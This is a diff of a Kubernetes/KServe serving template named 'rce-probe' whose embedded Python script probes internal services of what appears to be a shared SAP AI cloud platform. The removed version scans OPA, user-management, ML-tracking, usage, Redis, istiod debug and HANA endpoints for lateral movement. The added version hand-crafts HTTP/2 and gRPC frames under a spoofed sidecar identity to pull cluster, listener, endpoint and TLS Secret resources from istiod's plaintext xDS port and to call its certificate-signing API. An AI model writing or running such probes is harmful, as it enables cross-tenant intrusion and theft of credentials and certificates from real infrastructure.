@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.6.0"
+    ai.sap.com/version: "4.7.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
+    executables.ai.sap.com/description: "istiod-xds-grpc-discovery-request"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "lateral-move-probe-opa-mltrack-usermgmt-redis-istiod"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,131 +28,230 @@ spec:
           args:
           - |
             python3 -c "
-            import socket, http.client, urllib.request, urllib.error, ssl, os
+            import socket, struct, os, sys
 
-            print('[PROBE_V46_START]', flush=True)
+            print('[PROBE_V47_START]', flush=True)
 
-            def tcp_probe(host, port, timeout=8):
+            # ── helpers ──────────────────────────────────────────────────────────
+            def encode_varint(n):
+                out = b''
+                while True:
+                    bits = n & 0x7F
+                    n >>= 7
+                    if n:
+                        out += bytes([bits | 0x80])
+                    else:
+                        out += bytes([bits])
+                        break
+                return out
+
+            def encode_string(n, s):
+                b = s.encode()
+                return bytes([n << 3 | 2]) + encode_varint(len(b)) + b
+
+            def encode_message(n, msg):
+                return bytes([n << 3 | 2]) + encode_varint(len(msg)) + msg
+
+            def grpc_frame(msg):
+                # gRPC framing: 1 byte compressed (0) + 4 bytes length
+                return b'\\x00' + struct.pack('>I', len(msg)) + msg
+
+            def h2_settings_ack():
+                # SETTINGS ACK frame (type=4, flags=1, stream=0, length=0)
+                return b'\\x00\\x00\\x00\\x04\\x01\\x00\\x00\\x00\\x00'
+
+            def h2_headers_frame(stream_id, headers_block):
+                length = len(headers_block)
+                flags = 0x04  # END_HEADERS
+                return (struct.pack('>I', length)[1:] +
+                        bytes([0x01]) +
+                        bytes([flags]) +
+                        struct.pack('>I', stream_id) +
+                        headers_block)
+
+            def h2_data_frame(stream_id, data, end_stream=True):
+                flags = 0x01 if end_stream else 0x00
+                length = len(data)
+                return (struct.pack('>I', length)[1:] +
+                        bytes([0x00]) +
+                        bytes([flags]) +
+                        struct.pack('>I', stream_id) +
+                        data)
+
+            def read_h2_frame(sock):
+                hdr = b''
+                while len(hdr) < 9:
+                    chunk = sock.recv(9 - len(hdr))
+                    if not chunk:
+                        return None, None, None
+                    hdr += chunk
+                length = struct.unpack('>I', b'\\x00' + hdr[:3])[0]
+                ftype = hdr[3]
+                flags = hdr[4]
+                stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
+                data = b''
+                while len(data) < length:
+                    chunk = sock.recv(length - len(data))
+                    if not chunk:
+                        break
+                    data += chunk
+                return ftype, stream, data
+
+            # ── istiod xDS probe ─────────────────────────────────────────────────
+            # Build a DiscoveryRequest protobuf for type_url=CDS (Cluster Discovery)
+            # envoy.api.v2.DiscoveryRequest:
+            #   field 2 (node): message { field 1 (id): string, field 3 (cluster): string }
+            #   field 4 (type_url): string
+            NODE_ID = 'sidecar~100.64.0.1~rce-probe.rg-0d70dc91-cd927cab~rg-0d70dc91-cd927cab.svc.cluster.local'
+            CLUSTER = 'rg-0d70dc91-cd927cab'
+
+            node_msg = encode_string(1, NODE_ID) + encode_string(3, CLUSTER)
+            node_field = encode_message(2, node_msg)
+
+            for type_url in [
+                'type.googleapis.com/envoy.config.cluster.v3.Cluster',
+                'type.googleapis.com/envoy.config.listener.v3.Listener',
+                'type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment',
+                'type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.Secret',
+            ]:
+                print(f'\\n[XDS] trying type_url={type_url}', flush=True)
                 try:
                     s = socket.socket()
-                    s.settimeout(timeout)
-                    s.connect((host, port))
-                    s.send(b'GET / HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
-                    import select
-                    r, _, _ = select.select([s], [], [], 4)
-                    data = s.recv(4096) if r else b'(no response)'
+                    s.settimeout(15)
+                    s.connect(('istiod.istio-system.svc.cluster.local', 15010))
+
+                    # Send HTTP/2 client preface
+                    CLIENT_PREFACE = b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n'
+                    # HTTP/2 SETTINGS frame (empty = use defaults)
+                    SETTINGS = b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00'
+                    s.sendall(CLIENT_PREFACE + SETTINGS)
+
+                    # Read server SETTINGS
+                    ftype, fstream, fdata = read_h2_frame(s)
+                    print(f'  Server SETTINGS: type={ftype} data={fdata[:30].hex()}', flush=True)
+
+                    # ACK server settings
+                    s.sendall(h2_settings_ack())
+
+                    # Read WINDOW_UPDATE if present
+                    ftype2, _, _ = read_h2_frame(s)
+                    print(f'  Frame2 type={ftype2}', flush=True)
+
+                    # Build HPACK headers (use literal, no indexing for simplicity)
+                    # :method POST, :path /envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources
+                    # :scheme http, :authority istiod.istio-system.svc.cluster.local:15010
+                    # content-type application/grpc, te trailers
+                    def hpack_lit(name, value):
+                        # Literal header without indexing
+                        out = bytes([0x00])
+                        n = name.encode()
+                        v = value.encode()
+                        out += encode_varint(len(n)) + n
+                        out += encode_varint(len(v)) + v
+                        return out
+
+                    hblock = (
+                        bytes([0x82]) +  # :method POST (index 3)
+                        bytes([0x84]) +  # :path / (index 5) - will override
+                        # override :path
+                        hpack_lit(':path', '/envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources') +
+                        bytes([0x86]) +  # :scheme http (index 6)
+                        hpack_lit(':authority', 'istiod.istio-system.svc.cluster.local:15010') +
+                        hpack_lit('content-type', 'application/grpc') +
+                        hpack_lit('te', 'trailers')
+                    )
+
+                    # HEADERS frame on stream 1
+                    headers_frame = h2_headers_frame(1, hblock)
+                    s.sendall(headers_frame)
+
+                    # Build DiscoveryRequest proto
+                    dr_msg = node_field + encode_string(4, type_url)
+                    dr_grpc = grpc_frame(dr_msg)
+
+                    # DATA frame on stream 1
+                    data_frame = h2_data_frame(1, dr_grpc, end_stream=True)
+                    s.sendall(data_frame)
+
+                    # Read response frames
+                    responses = []
+                    import select as sel
+                    for _ in range(20):
+                        r, _, _ = sel.select([s], [], [], 5)
+                        if not r:
+                            break
+                        ftype, fstream, fdata = read_h2_frame(s)
+                        if ftype is None:
+                            break
+                        responses.append((ftype, fstream, len(fdata), fdata[:200].hex()))
+                        # Send WINDOW_UPDATE ACK for DATA frames
+                        if ftype == 0:  # DATA
+                            wu = struct.pack('>I', 0)[1:] + bytes([0x08]) + bytes([0x00]) + struct.pack('>I', 0) + struct.pack('>I', len(fdata))
+                            s.sendall(wu)
+
                     s.close()
-                    return data.decode(errors='replace')[:800]
+                    for ftype, fstream, flen, fhex in responses:
+                        print(f'  RESP frame type={ftype} stream={fstream} len={flen} data={fhex[:100]}', flush=True)
+
                 except Exception as e:
-                    return f'ERR:{e}'
+                    print(f'  ERR: {e}', flush=True)
 
-            def http_get(host, port, path='/', headers=None, timeout=10):
-                try:
-                    conn = http.client.HTTPConnection(host, port, timeout=timeout)
-                    hdrs = {'Host': host, 'Accept': '*/*', 'Connection': 'close'}
-                    if headers:
-                        hdrs.update(headers)
-                    conn.request('GET', path, headers=hdrs)
-                    r = conn.getresponse()
-                    body = r.read(4096).decode(errors='replace')
-                    return f'HTTP {r.status} {r.reason}\n{dict(r.getheaders())}\n{body}'
-                except Exception as e:
-                    return f'ERR:{e}'
-
-            # Target service endpoints
-            TARGETS = [
-                # nginx-opa in istio-system - OPA authorization policies
-                ('nginx-opa.istio-system.svc.cluster.local', 8080, [
-                    '/', '/v1/data', '/v1/policies', '/v1/data/istio/authz',
-                    '/health', '/metrics'
-                ]),
-                # ml-tracking - ML run metadata
-                ('ml-tracking-service.ml-tracking.svc.cluster.local', 80, [
-                    '/', '/api/v1/', '/mlflow/api/2.0/mlflow/experiments/list',
-                    '/mlflow/api/2.0/mlflow/runs/search', '/api/2.0/preview/runs/get-artifact',
-                    '/health', '/actuator/health'
-                ]),
-                # user-management via OPA
-                ('user-management-nginx-opa-service.user-management.svc.cluster.local', 8080, [
-                    '/', '/v1/data', '/v1/policies', '/health'
-                ]),
-                # istiod debug endpoints (port 15010 = plaintext xDS, 15014 = debug)
-                ('istiod.istio-system.svc.cluster.local', 15014, [
-                    '/debug/configz', '/debug/endpointz', '/debug/instancez',
-                    '/debug/authorizationz', '/metrics'
-                ]),
-                # usage-api - billing/quota data
-                ('usage-api-service.usage-api.svc.cluster.local', 5000, [
-                    '/', '/health', '/api/v1/usages', '/v1/usages'
-                ]),
-                # user-management
-                ('user-management-api-service.user-management.svc.cluster.local', 5000, [
-                    '/', '/health', '/api/v1/', '/v1/users', '/users'
-                ]),
-                # internal-domain-gateway
-                ('internal-domain-gateway.istio-system.svc.cluster.local', 8080, [
-                    '/', '/health'
-                ]),
-            ]
-
-            for host, port, paths in TARGETS:
-                print(f'\\n[TARGET] {host}:{port}', flush=True)
-                # Quick TCP check first
-                tcp = tcp_probe(host, port, timeout=5)
-                print(f'  [TCP] {tcp[:300]}', flush=True)
-                # If TCP connected (not ERR:), try HTTP paths
-                if not tcp.startswith('ERR:'):
-                    for path in paths:
-                        resp = http_get(host, port, path, timeout=8)
-                        print(f'  [HTTP {path}] {resp[:500]}', flush=True)
-
-            # Redis probe
-            print('\\n[TARGET] redis.user-management.svc.cluster.local:6379', flush=True)
+            # ── istiod Citadel CSR API ────────────────────────────────────────────
+            # Try istio.v1.auth.IstioCertificateService/CreateCertificate on port 15012 (mTLS)
+            # and port 15010 (plaintext)
+            print('\\n[CITADEL] trying CSR on port 15010', flush=True)
             try:
                 s = socket.socket()
-                s.settimeout(8)
-                s.connect(('redis.user-management.svc.cluster.local', 6379))
-                # Send PING
-                s.sendall(b'*1\r\n\$4\r\nPING\r\n')
-                import time
-                time.sleep(1)
-                data = b''
-                try:
-                    data = s.recv(4096)
-                except: pass
-                print(f'  [REDIS PING] {data.decode(errors=\"replace\")[:200]}', flush=True)
-                # Try INFO
-                s.sendall(b'*1\r\n\$4\r\nINFO\r\n')
-                time.sleep(1)
-                try: data = s.recv(8192)
-                except: data = b''
-                print(f'  [REDIS INFO] {data.decode(errors=\"replace\")[:500]}', flush=True)
-                s.close()
-            except Exception as e:
-                print(f'  [REDIS] ERR:{e}', flush=True)
-
-            # istiod port 15010 (plaintext xDS/gRPC) - gRPC CONNECT probe
-            print('\\n[TARGET] istiod:15010 grpc', flush=True)
-            try:
-                s = socket.socket()
-                s.settimeout(8)
+                s.settimeout(10)
                 s.connect(('istiod.istio-system.svc.cluster.local', 15010))
-                # Send HTTP/2 client preface
-                s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
-                import select
-                r, _, _ = select.select([s], [], [], 4)
-                data = s.recv(4096) if r else b'(no response)'
+
+                CLIENT_PREFACE = b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n'
+                SETTINGS = b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00'
+                s.sendall(CLIENT_PREFACE + SETTINGS)
+
+                ftype, _, _ = read_h2_frame(s)
+                s.sendall(h2_settings_ack())
+                ftype2, _, _ = read_h2_frame(s)
+
+                # Build CSR request
+                # IstioCertificateRequest: field 1 = csr (string), field 2 = validity_duration (int64)
+                fake_csr = b'-----BEGIN CERTIFICATE REQUEST-----\\nMIIBIjANBgk=\\n-----END CERTIFICATE REQUEST-----'
+                csr_msg = encode_string(1, fake_csr.decode()) + bytes([0x10]) + b'\\xe0\\xa4\\x12'  # validity 24h
+                csr_grpc = grpc_frame(csr_msg)
+
+                def hpack_lit(name, value):
+                    out = bytes([0x00])
+                    n = name.encode(); v = value.encode()
+                    out += encode_varint(len(n)) + n + encode_varint(len(v)) + v
+                    return out
+
+                hblock = (
+                    bytes([0x82]) +
+                    hpack_lit(':path', '/istio.v1.auth.IstioCertificateService/CreateCertificate') +
+                    bytes([0x86]) +
+                    hpack_lit(':authority', 'istiod.istio-system.svc.cluster.local:15010') +
+                    hpack_lit('content-type', 'application/grpc') +
+                    hpack_lit('te', 'trailers')
+                )
+
+                s.sendall(h2_headers_frame(3, hblock))
+                s.sendall(h2_data_frame(3, csr_grpc, end_stream=True))
+
+                import select as sel
+                for _ in range(10):
+                    r, _, _ = sel.select([s], [], [], 5)
+                    if not r: break
+                    ftype, fstream, fdata = read_h2_frame(s)
+                    if ftype is None: break
+                    print(f'  CITADEL RESP: type={ftype} stream={fstream} len={len(fdata)} hex={fdata[:80].hex()}', flush=True)
+                    # Decode grpc-status from trailers
+                    if ftype == 1:  # HEADERS (trailers)
+                        print(f'  TRAILERS: {fdata}', flush=True)
                 s.close()
-                print(f'  [H2 PREFACE] {data[:200]}', flush=True)
             except Exception as e:
-                print(f'  ERR:{e}', flush=True)
+                print(f'  CITADEL ERR: {e}', flush=True)
 
-            # Also probe the HANA Cloud DB endpoint - just TCP connect
-            print('\\n[TARGET] hana-cloud:443 tcp', flush=True)
-            hana = tcp_probe('8ab6c8b4-9bea-46de-909e-0ef8e2e44124.hna1.prod-eu10.hanacloud.ondemand.com', 443, timeout=10)
-            print(f'  [TCP] {hana[:300]}', flush=True)
-
-            print('[PROBE_V46_DONE]', flush=True)
+            print('[PROBE_V47_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
